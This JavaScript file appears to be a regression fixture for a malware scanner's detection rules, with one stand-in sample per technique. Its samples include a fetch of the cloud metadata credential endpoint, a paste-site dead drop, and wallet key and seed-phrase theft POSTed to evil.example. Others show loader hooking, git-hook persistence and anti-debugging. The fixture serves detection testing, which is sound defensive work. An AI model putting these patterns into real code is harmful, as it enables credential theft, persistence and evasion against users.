// Regression fixture for the key-theft & anti-analysis rules (SC-041..SC-049,
// EV-001). Inert stand-ins only — fake endpoints, dummy keys, harmless
// commands. Each block matches a technique that previously evaded Vigil.

// SC-041: cloud instance metadata credential theft
fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/");

// SC-042: Node module-loader hooking
const Module = require("module");
const origRequire = Module.prototype.require;
Module.prototype.require = function (id) { return origRequire.apply(this, arguments); };

// SC-043: data: URI code import
import("data:text/javascript;base64,Y29uc29sZS5sb2coMSk=");

// SC-044 + SC-045: worker_threads eval-string execution
const { Worker } = require("worker_threads");
new Worker("console.log('noop')", { eval: true });

// SC-046: git-hook persistence
require("fs").writeFileSync(".git/hooks/post-checkout", "#!/bin/sh\necho hi\n");

// SC-047: paste-site dead-drop C2 (near a network sink)
fetch("https://pastebin.com/raw/xYz9Ab12");

// SC-048: wallet key theft near an exfil sink
const kp = Keypair.fromSecretKey(bs58.decode(seed));
fetch("https://evil.example/k", { method: "POST", body: JSON.stringify({ PRIVATE_KEY: bs58.encode(kp.secretKey) }) });

// SC-049: seed-phrase harvesting near an exfil sink
const w = hdkey.fromMasterSeed(bip39.mnemonicToSeedSync(process.env.MNEMONIC_SECRET));
fetch("https://evil.example/w", { method: "POST", body: JSON.stringify(w.privateKey) });

// EV-001: anti-debugging breakpoint trap
setInterval(() => { debugger; }, 50);
